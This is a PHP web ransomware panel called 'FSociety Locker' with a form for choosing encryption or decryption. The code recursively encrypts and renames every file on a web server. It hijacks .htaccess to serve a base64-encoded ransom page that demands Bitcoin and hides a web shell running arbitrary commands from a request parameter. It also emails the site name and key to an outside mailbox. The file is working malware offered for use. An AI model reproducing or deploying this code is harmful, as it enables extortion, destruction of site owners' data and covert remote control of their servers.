<!DOCTYPE html>
<html>
<head>
   <title>FSociety Locker</title>
<style type="text/css">
body {
    background: black;
    color: green;
	
}
.input{
    border-style: dotted;
    border-color: white;
    background-color: black;
    color: white;
    text-align: center;
}
.select{
    border-style: dotted;
    border-color: white;
    background-color: black;
    color: white;

}
.submit{
       border-style: dotted;
    border-color: green;
    background-color: black;
    color: white;
}
.result{
  text-align: center;
  font-family: sans-serif;
}
h1{
  text-align: center;
  font-family: inherit;
  font-weight: bold;
}
h2{
  text-align: center;
}
.footer {
  position: fixed;
  bottom: 0px;
  font-weight: lighter;
  }
</style>

<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".fsoc")){
      rename(".htaccess", ".fbk");
      if(fwrite(fopen('.htaccess', 'w'), "#htaccess\r\nDirectoryIndex fs.php\r\nErrorDocument 404 /fs.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("fs.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KPHRpdGxlPlRoZSBzaG9ydCBhbmQgc2ltcGxlIG9uZTwvdGl0bGU+DQoNCg0KPHN0eWxlIHR5cGUgPSJ0ZXh0L2NzcyI+DQpib2R5IHsNCiAgICBiYWNrZ3JvdW5kIDogYmxhY2s7DQoJY29sb3I6IGdyZWVuOw0KCWZvbnQtZmFtaWx5OlRhaG9tYSxWZXJkYW5hLEFyaWFsOw0KCQ0KfQ0KaDF7DQoJdGV4dC1hbGlnbjogY2VudGVyOw0KCWZvbnQtZmFtaWx5OiBzZXJpZjsNCglmb250LXNpemU6IDIwUHg7DQoJY29sb3I6IGdyZWVuOw0KfQ0KcHsNCgl0ZXh0LWFsaWduOmNlbnRlcjsNCglmb250LWZhbWlseTpWZXJkYW5hOw0KfQ0KDQoNCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8Yj4NCjxwcmU+DQogIF9fX19fIF9fX18gICAgICAgICAgICAgXyAgICAgIF8gICAgICAgICANCnwgIF9fXy8gX19ffCAgX19fICAgX19fKF8pIF9fX3wgfF8gXyAgIF8gDQp8IHxfICBcX19fIFwgLyBfIFwgLyBfX3wgfC8gXyBcIF9ffCB8IHwgfA0KfCAgX3wgIF9fXykgfCAoXykgfCAoX198IHwgIF9fLyB8X3wgfF98IHwNCnxffCAgIHxfX19fLyBcX19fLyBcX19ffF98XF9fX3xcX198XF9fLCB8DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX18vIA0KPC9wcmU+PC9iPg0KDQo8aW1nIHNyYz0gImh0dHBzOi8vaS5waW5pbWcuY29tLzIzNngvYWMvMDkvZjQvYWMwOWY0N2ZjMTg0OTYzMjAwMDI5MGE0YzlkNTI2NzgtLW1yLXJvYm90LXJvYm90cy5qcGciCT4NCjxoMT4iV2UgYXJlIGZzb2NpZXR5LCB3ZSBhcmUgZmluYWxseSBmcmVlLCB3ZSBhcmUgZmluYWxseSBhd2FrZSEiPC9oMT4NCg0KPGI+V2FudCB0byByZWNvdmVyIHlvdXIgRGF0YT8/IGRvbmF0ZSAkMTAwIEJUQyBoZXJlIDogMThwTWk2NWlxV0I1bXRaN3NNRms5ZkozdmhVdmJFNGlHciA8L2I+IA0KPGk+b25jZSBkb25lIHdlIHdpbGwgZ2l2ZSB5b3UgZGVjcnlwdCBtZXRob2QuPC9pPg0KDQo8L2NlbnRlcj4NCg0KDQoNCg0KDQoNCjw/cGhwIGlmKGlzc2V0KCRfUkVRVUVTVFsnY21kJ10pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOyBzeXN0ZW0oJGNtZCk7IGVjaG8gIjwvcHJlPiI7IGRpZTsgfT8+DQoNCjwvYm9keT4NCjwvaHRtbD4NCg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  fs.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".fbk") ){
        if( unlink(".htaccess") && unlink("fs.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> fs.php (Default Page)<br>';
        }
        rename(".fbk", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"fsoc.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"fs.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".fbk") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }
   public function report($key){
        $message.= "=========     Details    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= EOF =========\n\n";
        $message.= "FSociety © 2017";
        $subject = "Report Ransomeware";
        $ducker = "iamrobot@secmail.pro";
		$headers = "From: Ransomware <ransomeware@0.today>\r\n";
        mail($ducker,$subject,$message,$headers);
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".fsoc");
        break;
        case '2':
          $locates = str_replace(".fsoc", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>

<b>
<pre>
<center>
 _____   _____   _____   _____   _   _____   _____  __    __ 
|  ___| /  ___/ /  _  \ /  ___| | | | ____| |_   _| \ \  / / 
| |__   | |___  | | | | | |     | | | |__     | |    \ \/ /  
|  __|  \___  \ | | | | | |     | | |  __|    | |     \  /   
| |      ___| | | |_| | | |___  | | | |___    | |     / /    
|_|     /_____/ \_____/ \_____| |_| |_____|   |_|    /_/     

											
</pre></b>
	
<fieldset>
<legend><h2>{ Command Center }</h2><legend>


<center>
  <form action="" method="post" style=" text-align: center;">
        <label>Enter your Hash	 : </label>
        <input type="text" size="40px" name="key" class="input" placeholder="Enter Secret to LOCK/UNLOCK">
        <select name="method" class="select">
           <option value="1">Encrypt</option>
           <option value="2">Decrypt</option>
        </select><br></br>
        <input type="submit" size="40" name="submit" class="submit" value="Submit" />
  </form>
</center>
<p><b>Expect me : </b></p>
<i>In my life, as I was making my way, I always asked the question, am I the most powerful person in the room?<i>
  <blockquote>Security is Myth !</blockquote></b>


</fieldset>
<div class="footer">
<i>./FSociety</i>
</div>
<?php
}?>
</div>
</body>
</html>


<?php
?>
